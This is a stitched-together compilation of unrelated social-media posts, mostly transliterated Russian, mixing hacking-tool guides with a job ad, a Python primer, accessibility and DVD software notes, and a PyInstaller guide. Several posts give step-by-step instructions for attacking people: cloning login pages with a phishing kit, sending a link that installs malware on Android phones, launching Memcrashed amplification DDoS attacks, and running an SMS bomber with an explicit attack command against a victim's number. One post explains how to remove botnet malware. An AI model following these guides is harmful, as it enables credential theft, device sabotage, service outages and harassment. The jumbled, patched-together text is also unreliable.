uspeem srabotat'sia.   Esli ty ne ishchesh' rabotu priamo seichas, no chuvstvuesh' interes i tsennostnyi metch, to davai znakomit'sia. Osobenno esli est' opyt v HR ili v rabote s HR.   ---   Etot zhe tekst v Notion: https://www.notion.so/awarehouse/Friday-38a70a3f637041489b71e1b494c76c77     Budu blagodaren za vashikh krutykh druzei, a takzhe za laiki, reposty i soobshcheniia v VK, FB https://facebook.com/kalupin ili TG https://t.me/awarehouse

Diskleimer:informatsiia predostavlena iskliuchitel'no v oznakomitel'nykh tseliakh, avtor stat'i za vashi deistviia ne nesiot otvetstvennosti! Bud'te bditel'ny pozhaluista!    Avtomatizirovannye fishing ataki  Fishing ataki perezhivaiut svoi pik populiarnosti. Ikh provedenie stalo proshche, a sposoby izshchrennee. Pri etom kolichestvo neopytnykh pol'zovatelei ne umen'shilos'. Srednestatisticheskii iuzer raspoznaiot lish' 6 iz 10 fishingovykh soobshchenii, soglasno issledovaniiu Intel Security.  Bolee togo, industriia fishinga sozdala ogromnoe kolichestvo instrumentov avtomatizatsii provedeniia atak. RevoltShing - odin iz nikh. On kopiruet absoliutno liuboi sait s razdelom avtorizatsii i imeet funktsiiu perenapravleniia posle vvoda dannykh.  Saity kopiruiutsia nastol'ko kachestvenno, chto aktivnymi ostaiutsia vse knopki, a vizual'nyi kontent v vide chasov, animatsii takzhe chastichno ostaetsia. Davaite vzglianem, kak eto rabotaet <<iznutri>>.  Ustanovka  Ustanavlivaem Kali Linux.  Skachivaem repozitorii s github komandoi  git clone https://github.com/AngelSecurityTeam/RevoltShing.git  Perekhodim v papku, daem prava, zapuskaem ustanovshchik  cd RevoltShing chmod +x install.sh bash install.sh  Dalee nuzhno zapustit' skonfigurirovannyi server i samu konsol' RevoltShing komandami  python Server.py python3 revoltshing.py  Ispol'zovanie  Pered vami poiavitsia konsol', gde sistema po standartu predlozhit klonirovat' sait Banka Ameriki.  Pomeniat' nastroiki mozhno komandoi  edit url https://<stranitsa avtorizatsii nuzhnogo resursa>  Perenapravlenie meniaetsia komandoi  edit url_destination https://<kuda napravit' pol'zovatelia posle vvoda dannykh>  Dlia starta prosto vpisyvaem  start  Gotovo. Vot tak prosto, bez znanii iazykov programmirovani,ia vozmozhno sozdat' fishingovyi sait absoliutno liubogo resursa.  #khaking

Ubivaem smartfon ssylkoi  Segodnia khochu rasskazat' vam, kak odnoi vredonosnoi ssylkoi mozhno v priamom smysle "ubit'" smartfon na baze Android.  Instruktsiia:  Dlia nachala, otkryvaem terminal v Kali Linux i vvodim sleduiushchuiu komandu dlia obnovleniia paketov:  update && pkg upgrade  Pered sozdaniem vredonosnoi ssylki nuzhno ustanovit' git i Python s pomoshch'iu dannykh komand:  install git pkg install python2 pkg install python3  Dalee, ustanavlivaem utilitu Lolcat komandoi:  install lolcat  Kloniruem imenno etot repozitorii s GitHub:  clone https://github.com/noob-hackers/Infect  Perekhodim v papku nashego "orudiia":  Infect  Nazhimaem i zapuskaem:  infect.s  Kak tol'ko zapustili, vybiraem pervyi punkt. Dalee prosto soglashaemsia so vsem, nazhimaia tri raza podriad Enter. Gotovo!  Kogda zhertva pereidet po nashei ssylke, na ustroistvo skachaetsia fail pod nazvaniem System Update.apk, no etogo malo. Nuzhno chtob zhertva ustanovila i zapustila fail, tol'ko posle etogo telefon zhertvy budet zarazhen virusom Elite.

GWTMap is a tool to help map the attack surface of Google Web Toolkit (GWT) based applications. The purpose of this tool is to facilitate the extraction of any service method endpoints buried within a modern GWT application's obfuscated client-side code, and attempt to generate example GWT-RPC requests payloads to interact with them.More information can be found here: https://labs.f-secure.com/blog/gwtmap-reverse-engineering-google-web-toolkit-applications.  RequirementsThe script requires Python3, argparse, and requests to run. They can be installed using the following command:  python -m pip install -r requirements.txt  UsageHelp$ ./gwtmap.py -husage: gwtmap.py [-h] [--version] [-u ] -F  [-b ] [-p ] [-c ] [-f ] [--basic] [--rpc] [--probe] [--svc] [--code] [--color] [--backup [DIR]] [-q]Enumerates GWT-RPC methods from {hex}.cache.js permutation filesArguments:-h, --help            show this help message and exit--version             show program's version number and exit-u , --url URL of the target GWT {name}... #basicauthentication #googlewebtoolkit #gwt #gwtmap

Razyskivaem sil'nogo Middle+ Python developer dlia razrabotki servisa po analitike telegramm-kanalov.    Tekhnicheski eto ochen' interesnyi proekt, gde vam nado budet realizovat' raspredelennyi krauling desiatkov tysiach Telegram-kanalov. Nastoiashchii Highload bez preuvelichenii: do 100 000 zapisei v bazu ezheminutno -- budet gde ottochit' navyki masshtabirovaniia prilozheniia i optimizatsii baz dannykh.    Rabotaem nebol'shoi komandoi, po kanbanu. Nikakikh zhestkikh sprintov, dedlainov i dotoshnogo prodakt-menedzhera nad tvoim dukhom. S nas -- interesnye zadachi, nenapriazhnaia atmosfera, otsutstvie biurokratii. S Vas -- stabil'naia i kachestvennaia rabota s entuziazmom.    Obiazannosti:  Realizatsiia biznes-logiki prilozheniia po chetko opisannym tekhnicheskim zadacham  Tekhnicheskii reserch s tsel'iu optimizatsii uzkikh mest  (Pri zhelanii) Razrabotka arkhitektury prilozheniia / skhem baz-dannykh / nastroika infrastruktury    Trebovaniia k opytu:  Ne menee 2-kh let opyta raboty v kommercheskikh proektakh  Glubokie znaniia Python3+, asyncio  Znanie printsipov raboty s PostgreSQL, vladenie SQL-sintaksisom    Budet pliusom:  Opyt razrabotki arkhitektury baz dannykh, optimizatsiia skorosti vypolneniia zaprosov  Opyt raboty s Redis, RabbitMQ  Opyt raboty s telethon/pyrogram ili liuboi drugoi bibliotekoi, ispol'zuiushchei tdlib  Opyt raboty s Docker-konteinerami (eshche luchshe - s Kubernetes)  Opyt napisaniia testov (eshche luchshe -- rabota v BDD-paradigme)  Stek: python3, asyncio, SQLAlchemy, PostgreSQL, Kubernetes, telethon    Bonusy  Polnost'iu udalennaia rabota  Gibkii grafik (sami raspredeliaete svoe vremia, nikto za Vami ne sledit)  Ezhenedel'naia oplata  Otsutstvie zhestkikh dedlainov    Kontakty: Petr, Telegram: nizarius

Privet!  OSINT - Eto razvedka, kotoraia osnovana na ispol'zovanii otkrytykh istochnikov informatsii. Grubo govoria, eto "Razvedovatel'naia" distsiplina, kotoraia vkliuchaet v sebia poisk, tshchatel'nyi otbor i sbor informatsii o tseli.  Utilita  Osi.ig - eto odna iz tysiachi OSINT-utilit, ona sposobna pomoch' pol'zovateliu v sbore informatsii ob uchiotke iuzera Instagram. Informatsiiu, kotoruiu mozhet naiti etot instrument, poprostu nereal'no uznat' prosto prosmatrivaia profil'.   Utilita proizvodit analiz profilia i predostavliaet spisok iz vsekh naidennykh kharakteristik i dannykh.  Kak budet vygliadet' spisok informatsii uzhe proskanirovannogo profilia: Foto, Podkliuchion li akkaunt k FB, Biznes-akkaunt (Da/Net), Vremia/Data registratsii, Biznes-Kategoriia i drugaia informatsiia, kotoraia budet obnaruzhena.  Podgotovka k ustanovke   Obnovlenie paketov:  apt update  alt upgrade  apt install git  apt install python   Ustanovka:  git https://github.com/th3unkn0n/osi.ig.git  cd osi.ig  chmod +x install.sh && ./install.sh   Zapusk:  python3 main.py -u username   Posle vypolneniia poslednei komandy, vam budet pokazana informatsiia, kotoraia byla raspisana vyshe. Takzhe instrument pozvoliaet analizirovat' i sostavliat' statistiku naibolee chasto ispol'zuemykh kheshtegov.

Iazyk programmirovaniia Python  Python predstavliaet populiarnyi vysokourovnevyi iazyk programmirovaniia, kotoryi prednaznachen dlia sozdaniia prilozhenii razlichnykh tipov. Eto i veb-prilozheniia, i igry, i nastol'nye programmy, i rabota s bazami dannykh. Dovol'no bol'shoe rasprostranenie piton poluchil v oblasti mashinnogo obucheniia i issledovanii iskusstvennogo intellekta.  Vpervye iazyk Python byl anonsirovan v 1991 godu gollandskim razrabotchikom Gvido Van Rossumom. S tekh por dannyi iazyk prodelal bol'shoi put' razvitiia. V 2000 godu byla izdana versiia 2.0, a v 2008 godu - versiia 3.0. Nesmotria na vrode takie bol'shie promezhutki mezhdu versiiami postoianno vykhodiat podversii. Tak, tekushchei aktual'noi versiei na moment napisaniia dannogo materiala iavliaetsia 3.7. Bolee podrobnuiu informatsiiu o vsekh relizakh, versiiakh i izmeneniia iazyka, a takzhe sobstvenno interpretatory i neobkhodimye utility dlia raboty i prochuiu poleznuiu informatsiiu mozhno naiti na ofitsial'nom saite https://www.python.org/.  Osnovnye osobennosti iazyka programmirovaniia Python:  Skriptovyi iazyk. Kod programm opredeliaetsia v vide skriptov.  Podderzhka samykh razlichnykh paradigm programmirovaniia, v tom chisle ob'ektno-orientirovannoi i funktsional'noi paradigm.  Interpretatsiia programm. Dlia raboty so skriptami neobkhodim interpretator, kotoryi zapuskaet i vypolniaet skript.  Vypolnenie programmy na Python vygliadit sleduiushchim obrazom. Snachala my pishim v tekstovom redaktore skript s naborom vyrazhenii na dannom iazyke programmirovaniia. Peredaem etot skript na vypolnenie interpretatoru. Interpretator transliruet kod v promezhutochnyi baitkod, a zatem virtual'naia mashina perevodit poluchennyi baitkod v nabor instruktsii, kotorye vypolniaiutsia operatsionnoi sistemoi.  Zdes' stoit otmetit', chto khotia formal'no transliatsiia interpretatorom iskhodnogo koda v baitkod i perevod baitkoda virtual'noi mashinoi v nabor mashinnykh komand predstavliaiut dva raznykh protsessa, no fakticheski oni ob'edineny v samom interpretatore.     Portativnost' i platformonezavisimost'. Ne imeet znacheniia, kakaia u nas operatsionnaia sistema - Windows, Mac OS, Linux, nam dostatochno napisat' skript, kotoryi budet zapuskat'sia na vsekh etikh OS pri nalichii interpretatora  Avtomaticheskoe upravlenie pamiati  Dinamicheskaia tipizatsiia  Python - ochen' prostoi iazyk programmirovaniia, on imeet lakonichnyi i v to zhe vremia dovol'no prostoi i poniatnyi sintaksis. Sootvetstvenno ego legko izuchat', i sobstvenno eto odna iz prichin, po kotoroi on iavliaetsia odnim iz samykh populiarnykh iazykov programmirovaniia imenno dlia obucheniia. V chastnosti, v 2014 godu on byl priznan samym populiarnym iazykom programmirovaniia dlia obucheniia v SShA.  Python takzhe populiaren ne tol'ko v sfere obucheniia, no v napisanii konkretnykh programm v tom chisle kommercheskogo kharaktera. V nemaloi stepeni poetomu dlia etogo iazyka napisano mnozhestvo bibliotek, kotorye my mozhem ispol'zovat'.  Krome togo, u dannogo iazyka programmirovaniia ochen' bol'shoe komm'iuniti, v internete mozhno naiti po dannomu iazyku mnozhestvo poleznykh materialov, primerov, poluchit' kvalifitsirovannuiu pomoshch' spetsialistov.  Ustanovka Python  Dlia sozdaniia programm na Python nam potrebuetsia interpretator. Dlia ego ustanovki pereidem na sait https://www.python.org/ i na glavnoi stanitse v sektsii Downloads naidem ssylku na zagruzku poslednei versii iazyka (na dannyi moment eto 3.7.2):     Pereidem po ssylke k stranitse s opisaniem poslednei versii iazyka. Blizhe k nizu na nei mozhno naiti spisok distributivov dlia raznykh operatsionnykh sistem. Vyberem nuzhnyi nam paket i zagruzim ego. Naprimer, v moem sluchae eto OS Windows 64-kh razriadnaia, poetomu ia vybiraiu ssylku na paket Windows x86-64 executable installer. Posle zagruzki distributiva ustanovim ego.     Sootvetstvenno dlia MacOS mozhno vybrat' punkt macOS 64-bit installer.  Na OS Windows pri zapuske installiatora zapuskaet okno mastera ustanovki:     Zdes' my mozhem zadat' put', po kotoromu budet ustanavlivat'sia interpretator. Ostavim ego po umolchaniiu, to est' C:\Users\[imia_pol'zovatelia]\AppData\Local\Programs\Python\Python36\.  Krome togo, v samom nizu otmetim flazhok "Add Python 3.6 to PATH", chtoby dobavit' put' k interpretatoru v peremennye sredy.  Posle ustanovki v meniu Pusk na OS Windows my smozhem naiti ikonki dlia dostupa k raznym utilitam pitona:     Zdes' utilita Python 3.7 (64-bit) predstavliaet interpretator, v kotorom my mozhem zapustit' skript. V failovoi sisteme sam fail interpretatora mozhno naiti po puti, po kotoromu proizvodilas' ustanovka. Na Windows po umolchaniiu eto put' C:\Users\[imia_pol'zovatelia]\AppData\Local\Programs\Python\Python37, a sam interpretator predstavliaet fail python.exe. Na OS Linux ustanovka proizvoditsia po puti /usr/local/bin/python3.7.

TASER (Testing And SEecurity Resource) - eto biblioteka resursov Python, ispol'zuemaia dlia uproshcheniia protsessa sozdaniia agressivnykh instrumentov bezopasnosti, osobenno tekh, kotorye kasaiutsia veb-otsenok ili vneshnikh otsenok. Ego modul'naia konstruktsiia pozvoliaet legko nastraivat' i povtorno ispol'zovat' kod v razlichnykh stsenariiakh.

Dopolnenie Training Keyboard commands V.2.1 Eto dopolnenie prednaznacheno dlia obucheniia klaviaturnym komandam NVDA v igrovoi forme, kak dlia nastol'noi raskladki, tak i dlia raskladki "noutbuk". Vse komandy berut'sia iz faila keyCommands.html v papke dokumentatsii vashego iazyka v NVDA. Eto dopolnenie ne imeet po umolchaniiu naznachennogo sochetaniia klavish ili zhesta. Vam neobkhodimo samostoiatel'no naznachit' goriachuiu klavishu v: meniu NVDA>parametry>zhesty vvoda>trainingKeyboardCommands.  Ispol'zovanie  spisok iz 7 elementov * Vyberite raskladku klaviatury, kotoruiu vy khotite izuchit', i nachnite igru  * Poiavitsia komanda i eio opisanie, i vam nuzhno budet vybrat' pravil'nyi otvet iz spiska  * Esli vy vybrali pravil'nyi otvet, vy poluchite 1 ball  * Esli otvet nevernyi, schiot ne izmenitsia, vy nichego ne poteriaete  * V liuboe vremia, esli vy pozhelaete vyiti, vas sprosiat, khotite li vy sokhranit' tekushchuiu igru  * Esli pozzhe vy vyberite rasskladku, dlia kotoroi est' sokhranionnaia igra, vas sprosiat, khotite li vy eio vosstanovit'  * Kogda vy otvetite na vse voprosy, okolo 88 dlia kazhdoi raskladki, vy budete ob'iavleny pobeditelem, kotoryi zasluzhivaet kubok NVDA.  * Zagruzit': https://github.com/ibrahim-s/trainingNvdaCommands.git * Avtor: Ibrahim Hamadeh *  Lokalizatsiia na russkii: Andrei Iakuboi https://vk.com/futyn_maker * Sovmestimost' s NVDA: 2019.3 i vyshe  * Sovmestimost' s Python: tol'ko Python3  * Esli u vas bolee staraia versiia NVDA, pozhaluista, ispol'zuite predydushchuiu versiiu 1.3-dev.

Legenda, memcrashed DDoS. Ustanovka na Windows a takzhe na Kali Linux  Ataka v 2TB/sek.  Memcrashed - eto instrument, pozvoliaiushchii ispol'zovat' Shodan.io dlia polucheniia soten uiazvimykh Memcached serverov. Zatem on pozvoliaet ispol'zovat' te zhe servery dlia zapuska shiroko rasprostranennoi ataki tipa DDoS putem poddelki paketov UDP, poluchennykh vashei zhertvoi. Poleznaia nagruzka po umolchaniiu vkliuchaet v sebia komandu memcached "stats", 10 baitov dlia otpravki, no otvet sostavliaet ot 1500 bait do soten kilobait. Tol'ko predstav'te sebe tsifry. Ochen' groznoe oruzhie. Chtoby oznakomitsia s posledstviiami uzhe proizvedennykh atak, prosto zaguglite. Posledstviia i moshchnost' prosto porazhaiut. 28 fevralia 2108 g. na GitHub.com proizoshla ataka moshchnost'iu 1,35 Tb/sek.   I tak perekhodim k ustanovke na Windows  Stavim python https://www.python.org/downloads/  Skachivaem s GitHub memcrashed https://github.com/649/Memcrashed-DDoS-E...  Raspakovyvaem arkhiv po puti C:\ Zapuskaem cmd  Propisyvaem cd C:\  Dalie cd Memcrashed-DDoS-Exploit  Zapuskaem  pip install -r requirements.txt  python Memcrashed.py  Dalie nuzhno budet vvesti kliuch ot Shodan(Mozhno kupit' ego po ssylke https://www.shodan.io/)   Dal'she vsio poniatno razobrat'sia ne trudno(:   Ustanovka na Kali Linux. apt-get update & apt-get upgrade git clone https://github.com/649/Memcrashed-DDoS-E... apt-get install python3 pip install scapy pip install shodan cd /Memcrashed-DDoS-Exploit pip install -r requirements.txt python3 Memcrashed.py Utilita zapushchena vodim kliuch  Vozmozhnye problemy na windows: Esli pri vode pip install -r requirements.txt proiskhodit oshibka, to poprobuite ne raspakovat' arkhiv. Esli pri vode python Memcrashed.py proiskhodit oshibka to poprobuite vesti python3 Memcrashed.py

Stavim legendarnyi i moshchnyi SMS bomber Impulse. Rabotaet na  android v Termux  Povtoriaem za mnoi:  1.Obnovliaem pakety: $ pkg update $ pkg upgrade  2.Stavim nuzhnuiu pravku pitona: $ pkg install python3     $ python3-pip git -y $ pkg install python -y  $ pkg install python2 -y   3.Otgitklonivaem soft: $ git clone https://github.com/LimerBoy/Impulse  4. Perekhodim v direktoriiu : $ cd Impulse  5.Tut tozhe vse prosto:  $ pip3 install -r requirements.txt  6.Zapuskaem:  $ python3 impulse.py -- help  Dlia ataki ispol'zuetsia dannaia komanda: $ python impulse.py --target 77777777777 --method SMS --time 60 --threads 999  (Time-vremia) Threads(kol-vo potokov) Target- nomer zhertvy. Vsem priiatnykh atak) Stavte ne  --, a - - bez probela

Devede NG es una reestructuracion del viejo Devede con Python3 y GTK3 de codigo libre que permite la creacion de CD de video y DVD de un MPEG, AVI y formatos similares adecuados para reproductores de DVD caseros. Devede NG utiliza Mplayer, Mencoder, MKisofs, DVDAuthor, y VCDimager. Esta disponible para multiples distribuciones, como Debian y basadas, Fedora, Arch Linux, Void y tiene una version fuente con GIT en GitLab.

TASER (Testing And SEecurity Resource) is a Python resource library used to simplify the process of creating offensive security tooling, especially those relating to web or external assessments. It's modular design makes it easy for code to be customized and re-purposed in a variety of scenarios.Key features    Easily invoke web spiders or search engine scrapers to aid in data collection.  Supports rotating User-Agents and/or proxies, and custom headers per request to evade captchas.  Implement concurrent web requests with threading or asyncio.  Uses Python logging to create custom console, file, and database loggers for various output formats.  Automatically detect Windows OS to control ANSI colored output, when using the Taser custom adapter. Primer dlia centos 8:    # dnf install python3-pip  # pip3 install gixy  # gixy /etc/nginx/nginx.conf    I dal'she smotrite rekomendatsii. Ia protestiroval na nginx, kotoryi rabotaet v kachestve proxy i poluchil rekomendatsiiu, zamenit'    proxy_set_header Host $http_host;    na    proxy_set_header Host $host;    I tut zhe ssylka na opisanie, pochemu tak stoit sdelat' - https://github.com/yandex/gixy/blob/master/docs/en/plugins/hostspoofing.md. V obshchem, rekomenduiu, osobenno esli na potoke mnogo rabotaete s nginx. Nado budet vse svoi shablony konfiguratsii proverit' etoi shtukoi.

Staticheskii analizator na Python3. Laba v universitete    Ispol'zuia iazyk programmirovaniia Python razrabotat' v vide otdel'nogo paketa dlia pip konsol'nuiu interaktivnuiu utility staticheskogo analiza i modifikatsii programmnykh kodov dlia iazyka Dart. Paket dolzhen byt' opublikovan na pypi.org.  Cistema dolzhna umet': 1. Vypolniat' analiz struktury dereva proektu i obnaruzhivat' faily, soderzhashchie programmnye kody na opredelennom iazyke programmirovaniia (Dart) putem analiza rasshirenii failov  2. Vypolniat' analiz sobliudeniia konventsii po imenovaniiu i dokumentirovaniia v ramkakh otdel'nykh failov s programmnymi kodami na opredelennoi iazyke programuvaniia (Dart) i vyiavliat' nesootvetstviia i oshibki. V sluchae vyiavleniia nesootvetstvii i oshibok, sistema dolzhna osushchestvliat' sootvetstvuiushchie zapisi v spetsial'nyi fail * _verification.log, ukazyvaia polnyi put' k faila, nomer stroki i tip oshibki ili nesootvetstviia v formate:   Id. File Path: Line Number - Error Code: Error Message 3. Vypolniat' modifikatsii otdel'nykh chastei programmnykh kodov, kotorye ne otvechaiut konventsiiam po imenovaniiu i dokumentirovaniia dlia iazyka Dart, s tsel'iu privedeniia programmnykh kodov k maksimal'noi sootvetstvii dannym Konventsiia. Vo vremia modifikatsii programmnykh kodov sistema dolzhna osushchestvliat' sootvetstvuiushchie zapisi v spetsial'nyi fail * _fixing.log, ukazyvaia polnyi put' k failu, nomer stroki i vypolnennuiu modifikatsiiu v formate  Id. File Path: Line Number - Modification Description V opisanii paketa neobkhodimo chetko ukazat', kakie imenno konventsii kasatel'no imenovaniia i dokumentirovaniia proveriaet i ispravliaet sozdannyi paket. Funktsional'nye trebovaniia k sisteme: Zapreshchaetsia ispol'zovat' liubye postoronnie instrumenty dlia leksicheskogo ili sintaksicheskogo analiza programmnykh kodov (gotovye Lekser, spetsializirovannye biblioteki i t.d.) kak chasti sistemy.  Neobkhodimo realizovat': - Konsol'nuiu utilitu (v vide otdel'nogo paketa dlia pip), kotoraia dolzhna instalirovat'sia s pomoshch'iu pip i zapuskat'sia iz komandnoi stroke terminala operatsionnoi sistemy i imet' spravku s opisaniem vsekh osnovnykh komand i kliuchei. -Otdel'nye komandy i nabor kliuchei dlia ispol'zovaniia vsekh funktsii sistemy. -Nabor parametrov i kliuchei dlia analiza i modifikatsii otdel'nykh failov, katalogov s failami, katalogov s podkatalogami i failami. Orientirovannyi format sintaksisa: python3 SLangSSF --verify -(p|d|f) /.. python3 SLangSSF -v -(p|d|f) /.. python3 SLangSSF --fix -(p|d|f) /.. python3 SLangSSF -f -(p|d|f) /.. python3 SLangSSF --help python3 SLangSSF -h SLang - source language SSF - code conventions fixer -p - project -d - directory -f - file /.. - path to project, directory or file Testirovanie i demonstratsiia: - Dlia chastichnogo testirovaniia raboty sistemy nuzhno sravnivat' rezul'taty ee raboty s sootvetstvii rezul'tatam analiza programmnykh kodov s pomoshch'iu IDEs JetBrains - Dlia demonstratsii raboty sistemy neobkhodimo ispol'zovat' katalogi i faily iz Github ili s Gitlab. Realizatsiia analizatora dolzhna vypolniat'sia na iazyke Python3 Podrobnaia informatsiia o konvetsii tut:  Vazhno nalichie kommentariev k resheniiu i ob'iasnenie kak rabotaet reshenie.  https://freelancehunt.com/project/staticheskiy-analizator-na-python3-laba/771919.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

Nedavno zadumalsia nad tem, chto vdrug kto-to reshit proverit' na samom li dele sozdastsia vredonosnyi fail system.py, i vspomnil, chto ia stolknulsia s opredelennoi problemoi oshibki v avtozagruzke skripta, kotoryi zapuskaet system.py, posle udaleniia poslednego. Seichas ia popytaius' prodemonstrirovat' to, kak rabotaet dannaia vredonosnaia programma i sposob resheniia dannoi problemy putem ee polnogo udaleniia. Pristupim..  I tak, nachnem: 1)  Skachivaem vredonosnuiu programmu dos(kak primer) iz WannaDeauth:  apt install python -y git clone https://github.com/WannaDeauth/dos cd dos chmod -R a+rx *   *Ustanavlivaem vse neobkhodimye moduli*  pip install colorama requests socket time bs4   *Esli vylezaet oshibka*  WARNING: You are using pip version 19.2.3, however version 20.2.4 is available. You should consider upgrading via the 'pip install --upgrade pip' command.   To my obnovliaem pip*  pip install --upgrade pip   *Posle snova ustanavlivaem vse neobkhodimye moduli, kak napisano vyshe. Nuzhno, chtoby programma khot' raz zapustilas', poetomu my vvodim:  python wannados.py   Vse, programma nam bol'she ne prigoditsia. Ona uzhe sdelala vse, chto dolzhna byla: sozdala system.py(i, kak okazalos', eto ne vse). Nazhimaem ctrl + d, chtoby vyiti iz programmy ili perezapuskaem termux  2)  *Ubedimsia, chto skript system.py sushchestvuet*  cd ~ cat /data/data/com.termux/files/usr/bin/system.py   *Esli vyvelsia kod system.py, kak na 1 skrine, to vash termux zarazhen i budet ispol'zovat'sia v botnete, no v kontse posta my izbavimsia ot vredonosnoi programmy  3)  I tak, v dal'neishem budu govorit' sugubo na lichnom opyte. Ia reshil, chto, udaliv system.py, vredonosnaia programma budet polnost'iu udalena s termux'a:  rm /data/data/com.termux/files/usr/bin/system.py   Kak okazalos', tak i est', virus uzhe ne deesposoben, no posle udaleniia skripta, ia otkryl novuiu sessiiu termux'a i uvidel oshibku, kak na 2 skrine. Ia reshil, chto avtor zapisal zapusk vredonosnogo skripta v bash.bashrc, no, proveriv, ponial, chto tam tol'ko moi kastomnye alias'y, da funktsii. Posle ia predprinial posmotret' vse zapushchennye protsessy s momenta vkliucheniia sessii pri pomoshchi lsof i ps, kak na 3 skrine, zapisal eti komandy v bash.bashrc, i uvidel, chto python3.8 zapuskaet fail system.py, a tak zhe to, chto cherez sokety proiskhodit obmen dannymi(socket'y ne vsegda otobrozhaiutsia v lsof)  Bylo ochen' interesno uznat', kakoi skript zapuskaet system.py pri pomoshchi python. Vnachale podumal, chto ne zria kod wannados.py zashifrovan, i, byt' mozhet, on i zapuskaet system.py. Udalil ia direktoriiu dos, no problema ne reshilas'.  4)  Posle etogo ia podumal i reshil poiskat' faily na nalichie v nikh koda s zapuskom system.py(da i voobshche s tekstom system.py) v sistemnykh direktoriiakh:  cd /data/data/com.termux/files/usr grep -r 'system.py' .   *Posle vvoda dannykh kommand budet vyvedeno primerno tozhe samoe, chto i na 4 skrine. Nas interesuet to, chto ia vydelil na skrine. Mm, skript login, kotoryi nakhoditsia v usr/bin zapuskaet system.py, da eshche i v background(&). INTERESTING!!!   Dlia nagliadnosti posmotrim kod login pri pomoshchi nano(5 skrin):  nano /data/data/com.termux/files/usr/bin/login *dlia vykhoda: ctrl +x*   My vidim, chto v 3 stroke skript zapuskaet system.py, a v 4 delaet clear  5)  Chtoby udalit' polnost'iu etu vredonosnuiu programmu nuzhno izbavit'sia ot system.py, a tak zhe ubrat' 3 i 4 stroki iz skripta login. Otredaktirovat' skript login, dumaiu, smozhet kazhdyi   V zakliuchenie khotelos' by skazat', chto nuzhno s ostorozhnost'iu otnosit'sia ko vsem programmam s github'a i drugikh skhozhikh veb-servisov, tak kak ne vsegda programmy, dazhe s takikh krupnykh veb-servisov, iavliaiutsia bezopasnymi.  Poproshu rasprostranit' etot post, chtoby kazhdyi coder ili prosto chelovek, uvlekaiushchiisia IT, linux'om, termux'om etc., byl osvedomlen ob ikh kanale(WannaDeauth), github'e i ikh vredonosnykh programmakh

Chto takoe AutoGadgetFS?  AutoGadgetFS - eto sreda s otkrytym iskhodnym kodom, kotoraia pozvoliaet pol'zovateliam otsenivat' USB-ustroistva i sviazannye s nimi khosty / draivery / programmnoe obespechenie bez glubokikh znanii protokola USB. Instrument napisan na Python3 i ispol'zuet RabbitMQ i dostup k Wi-Fi, chtoby issledovateli mogli provodit' udalennuiu otsenku bezopasnosti USB iz liuboi tochki mira. Ispol'zuia ConfigFS, AutoGadgetFS pozvoliaet pol'zovateliam bystro klonirovat' i emulirovat' ustroistva, izbavliaia ot neobkhodimosti uglubliat'sia v detali kazhdoi realizatsii. Freimvork takzhe pozvoliaet pol'zovateliam sozdavat' svoi sobstvennye fazzery poverkh nego.

"""  What is this register used for?Hmm.. I'll just rename it to veryuniquename, do a textual search, and find all references!Ok.. Waiting for the search to end.. any minute now.. Done!Now I just need to understand which of the search result is relevant to the current usage frame of the register.Shouldn't be too hard, right?"""    If this happened to you (perhaps more than once), you are in for a treat!Just Shift-X, and your troubles will go away!  You may also re(g)name the register in the usage frame. Just Shift-N, and follow instructions!Also - instead of changing the types of all the usages to a certain type, just Shift-T once.  Note: Sometimes there is already another plugin using Shift-T. Remove that plugin - you never used it before anyway  .InstallationPrerequisitesThis plugin uses sark to interact with the IDA scripts in a comfortable way, and cachetools to cache the frame scan which makes this a whole of a lot faster.  [For python2]pip install sarkpip install cachetools  [For python3]If using python3 variant of IDA, you should instead run:pip3 install -U git+https://github... #analysis #ida #oregami #plugin #python3..

NTLMRawUnhide.py is a Python3 script designed to parse network packet capture files and extract NTLMv2 hashes in a crackable format.  The tool was developed to extract NTLMv2 hashes from files generated by native Windows binaries like NETSH.EXE and PKTMON.EXE without conversion.  The following binary network packet capture formats are supported:    *.pcap  *.pcapng  *.cap  *.etlUsageUsage: NTLMRawUnhide.py -i  [-o ] [-f] [-h] [-q] [-v]  Main options:-f, --follow               Continuously "follow" (e.g. "read from")input file for new data-h, --help-i, --input     Binary packet data input file(.pcap, .pcapng, .cap, .etl, others?)-o, --output   Output file to record any found NTLMhashes-q, --quiet                Be a lot more quiet and only outputfound NTLM hashes. --quiet will alsodisable verbose, if specified.-v, --verbose  ExamplesExtract NTLMv2 hashes from examples/capture.pcap:  python3 NTLMRawUnhide.py -i examples/capture... #hashes #network #ntlm #ntlmrawunhide #packetcapture #python3 #smb #windows

https://habr.com/ru/post/325626/ Pristupaem k sborke    Prezhde chem pristupit' k sborke my dolzhny ustanovit' neobkhodimye biblioteki, a imenno pywin32 i sobstvenno pyinstaller:      pip install pypiwin32  pip install pyinstaller    Chtoby ubeditsia, chto vse normal'no ustanovilos', vvodim komandu:      pyinstaller --version    dolzhna vysvetit'sia versiia pyinstaller. Esli vse pravil'no ustanovilos', idem dal'she.      V papke s proektom zapuskaem cmd i nabiraem:       pyinstaller myscript.py    Sobstvenno eto i est' prosteishaia komanda, kotoraia soberet nash proekt.  Sintaksis komandy pyinstaller takov:      pyinstaller [options] script [script ...] | specfile      Naibolee chasto ispol'zuemye optsii:      --onefile -- sborka v odin fail, t.e. faily .dll ne pishutsia.  --windowed -pri zapuske prilozheniia, budet poiavliat'sia konsol'.  --noconsole -- pri zapuske prilozheniia, konsol' poiavliat'sia ne budet.  --icon=app.ico -- dobavliaem ikonku v okno.  --paths -- vozmozhnost' vruchnuiu propisat' put' k neobkhodimym failam, esli pyinstaller  ne mozhet ikh naiti(naprimer: --paths D:\python35\Lib\site-packages\PyQt5\Qt\bin)      PyInstaller analiziruet fail myscript.py i delaet sleduiushchee:      Pishet fail myscript.spec v toi zhe papke, gde nakhoditsia skript.  Sozdaet papku build v toi zhe papke, gde nakhoditsia skript.  Zapisyvaet nekotorye logi i rabochie faily v papku build.  Sozdaet papku dist v toi zhe papke, gde nakhoditsia skript.  Pishet ispolniaemyi fail v papku dist.    V itoge nasha komanda budet vygliadet' tak:      pyinstaller --onefile --icon=name.ico --noconsole myscript.py    Posle raboty programmy vy naidete dve papki: dist i build. Sobstvenno v papke dist i nakhoditsia nashe prilozhenie. Vposledstvii papku build mozhno spokoino udalit', ona ne vliiaet na rabotosposobnost' prilozheniia.

